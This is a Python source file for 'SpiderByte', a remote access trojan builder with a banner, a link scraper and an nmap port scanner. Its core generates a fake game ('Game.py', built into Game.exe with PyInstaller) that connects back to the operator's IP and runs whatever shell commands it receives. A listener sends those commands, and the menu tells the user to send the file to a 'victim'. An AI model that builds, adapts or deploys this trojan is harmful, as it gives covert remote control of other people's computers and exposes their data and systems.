# SpiderByte Easy to make RAT attack
import time
import os
import sys
import nmap
import urllib
import requests
import socket
import colorama
import subprocess
import PyInstaller.__main__ as installer
from colorama import init, Fore
from bs4 import BeautifulSoup as sp
init()
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN

# Defining the first animation

os.system("cls")
time.sleep(1)
def spider_animation():
    SPIDERS1 = """
      █       █
     █  *███*  █
       ███████
     █   ███   █
    █  █  *  █  █
        █   █
    """

    SPIDERS2 = """
    █           █
     █  *███*  █
    █  ███████  █
     █   ███   █
       █  *  █  
      █       █
    """
    count = 0
    for i in range(20):
        if count == 0:
            _SPIDERS_ = SPIDERS1
            count = 1
        elif count == 1:
            count = 0
            _SPIDERS_ = SPIDERS2
        print(_SPIDERS_)
        time.sleep(0.5)
        os.system('cls')

def load_animation(text):
    # String to be displayed when the application is loading
    load_str = text
    ls_len = len(load_str)

    # String for creating the rotating line
    animation = "|/-\\"
    anicount = 0

    # used to keep the track of
    # the duration of animation
    counttime = 0

    # pointer for travelling the loading string
    i = 0
    while (counttime != 100):
        os.system('')
        # used to change the animation speed
        # smaller the value, faster will be the animation
        time.sleep(0.075)

        # converting the string to list
        # as string is immutable
        load_str_list = list(load_str)

        # x->obtaining the ASCII code
        x = ord(load_str_list[i])

        # y->for storing altered ASCII code
        y = 0

        # if the character is "." or " ", keep it unaltered
        # switch uppercase to lowercase and vice-versa
        if x != 32 and x != 46:
            if x > 90:
                y = x-32
            else:
                y = x + 32
            load_str_list[i] = chr(y)

        # for storing the resultant string
        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        # displaying the resultant string
        sys.stdout.write("\r"+res + animation[anicount])
        sys.stdout.flush()

        # Assigning loading string
        # to the resultant string
        load_str = res

        anicount = (anicount + 1) % 4
        i = (i + 1) % ls_len
        counttime = counttime + 1
    os.system('cls')


# Running first animation
load_animation("starting spiderbyte....")
spider_animation()

# Bannar
print("Welcome!")
print(f"""{C}
..........................................................................................................
         █           █                                                                                       
    █   █             █   █
   █   █               █   █
    █   ██           ██   █
     ██   ██ *███* ██   ██
       ███  ███████  ███              *****************************************************************
           █████████                  *|█████████████████████████████████████████████████████████████|*
        ███  █████  ███               *|█─▄▄▄▄█▄─▄▄─█▄─▄█▄─▄▄▀█▄─▄▄─█▄─▄▄▀███▄─▄─▀█▄─█─▄█─▄─▄─█▄─▄▄─█|*
      ██    ███████    ██             *|█▄▄▄▄─██─▄▄▄██─███─██─██─▄█▀██─▄─▄████─▄─▀██▄─▄████─████─▄█▀█|*
     █    ██ █████ ██    █            *|▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▀▀▄▄▄▄▀▀▀▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀|*
    █    █  ███████  █    █           *|*************{Y}Version 4.0{C}*********************{G}By:-MaxMouse{C}****|*   
   █    █  █████████  █    █          *****************************************************************
    █   █    █████    █   █
     █   █     █     █   █
          █         █
           █       █.....................................................................................

{G}""")

c = ""
z = ""

#print(f"{R}Think before you go, {C}great powers {G}come with a great {Y}responsibility....{G}")

# Defining the help (main help)


def help1():
    lines = ['==================================================================',

        'a   Remote virus',
        'h   Show this help',
        "l   Get all the links in a site",
        'w   Seach for a word in an url',
        'c   Clear the terminal',
        'e   Exit the programme',

    '==================================================================']
    for line in lines:
        print(f"{C}{line}{G}")
        time.sleep(0.1)

help1()

# Defining the help2


def help2():
    print("""
        sc   start a host scan
        vv   start the virus attack
        re   return to main Menu
        ex   exit whole script
        hh   show this help
        """)

def Word():
    url = input('Enter the url: ')
    word = input('Enter the word: ')
    os.system('cls')
    stt = time.time()
    print('Working on', url)
    try:
        grab = requests.get(url)
        print('Scrapping....')
        soup = sp(grab.text, 'html.parser')
        count = 0
        for link in soup.find_all("a"):
            count = count+1
            data = link.get('href')
            link = data
            if link.startswith('#'):
                pass
            else:
                temp = urllib.request.urlopen(link)
                HTML = temp.read().decode("utf-8")

                if word in HTML:
                    print(f"Found in: {data}")
                else:
                    pass

        ste = time.time()
        finaltime = ste-stt
        print('Searched in ', count, 'links, in', str(finaltime), 'seconds')
        print('Done')

    except Exception:
        print("Value Error")
        pass

def GetLinks():
    url = input('Enter the url: ')
    os.system('cls')
    stt = time.time()
    print('Working on', url)
    try:
        grab = requests.get(url)
        print('Scrapping....')
        soup = sp(grab.text, 'html.parser')

        f = open('links.txt', 'w')
        print('Writing....')
        count = 0
        for link in soup.find_all("a"):
            count = count+1
            data = link.get('href')
            f.write(data)
            print(data, '\n')
            f.write('\n')
        f.close()
        ste = time.time()
        finaltime = ste-stt
        print('Found', count, 'links, in', str(finaltime), 'seconds')
        print('Done')

    except Exception:
        print("Error")
        pass

# Defining the port scan


def port_scan():
    target = input("Enter the host to be scaned(Must be an IP address):- ")
    range = input("Enter the range(ex:-21-443):- ")
    nmScan = nmap.PortScanner()

    nmScan.scan(target, range)

    for host in nmScan.all_hosts():
        print("Host : %s (%s)" %
              (host, nmScan[host].hostname()))
        print('State : %s' % nmScan[host].state())
        for proto in nmScan[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = nmScan[host][proto].keys()
            # lport.sort()
            for port in lport:
                print('Port : %s\tstate : %s' %
                      (port, nmScan[host][proto][port]['state']))

def est():
    file_path = os.getcwd()
    ip = input("Enter the host ip: ")
    print("Host:", ip)
    a = open("Game.py", "w+")
    a.write(f"""
import socket
import time
import subprocess

print("Loading the game....")

slave = socket.socket()
host = "{ip}"

port = 8080

def conect(host, port):
    try:
        slave.connect((host, port))
    except Exception:
        time.sleep(1)
        conect(host, port)

conect(host, port)

while True:
    command = slave.recv(1024).decode()
    if command == "exit":
        break
    elif command == "host":
        address = socket.gethostbyname(socket.gethostname())
        slave.send(address.encode())
        command = ""
        pass
    output = "Output: "
    if command != "":
        output += subprocess.getoutput(command)
        slave.send(output.encode())

slave.close()
""")
    a.close()
    print("Executing....\n")
    installer.run([
        'Game.py',
        '--onefile'
    ])
    print("Removing temp....")
    os.remove("Game.py")
    os.remove("Game.spec")
    print("Done")
def controler():
    print("""
    Commands to use:-
        host    get the host ip of victim's computer
        exit    exits the both scripts
        CMD commands
    """)

    try:
        master = socket.socket()

        host = '0.0.0.0'
        port = 8080

        master.bind((host, port))
        print("Waiting....")
        master.listen(1)
        try:
            slave, address = master.accept()
        except Exception as a:
            print(str(a))

        print("Listening....\n")
        while True:
            print(">", end=" ")
            command = input()
            slave.send(command.encode())
            if command == "exit":
                break
            output = slave.recv(5000)
            print(output.decode())

        master.close()
    except KeyboardInterrupt:
        master.close()
        virus()

# Defining the virus attack


def virus():
    while z == "":
        i = input(f"({C}Virus{G})>> ")
        if i == "re":
            print("Returning to main script....")
            go()  # will run the main script again
        elif i == "sc":
            port_scan()
        elif i == "hh":
            help2()
        elif i == "ex":
            exit()
        elif i == "vv":
            y = input("Do you want to continue(y/n): ")
            if y == "y":
                est()
                print(f"{Y}Game.exe{G} is now available in {Y}dist{G} folder")
                get = input(f"\n{C}Send the virus(Game.exe) to the victim and type '{Y}start{C}' and press enter....:- {Fore.RESET}")
                if get == "start":
                    print(f"{Y}Starting connection....{Fore.RESET}\n")
                    controler()
            elif y == "n":
                virus()
        else:
            print("Use hh for help!")
# Programme loop

def go():
    try:
        while True:
            x = input(f"{G}({C}SpiderByte{G})>> ")
            if x == 'h':
                help1()
            elif x == 'a':
                print(f"Use{Y} hh{G} for help!")
                virus()
            elif x == 'l':
                GetLinks()
            elif x == 'w':
                Word()
            elif x == 'c':
                os.system('cls')
            elif x == 'e':
                print(f"{C}Thank you for using this tool!{Fore.RESET}")
                sys.exit(0)
            else:
                print("Enter 'h' for help!")
    except Exception as e:
        print(Fore.RESET + str(e))
        sys.exit(0)

go()
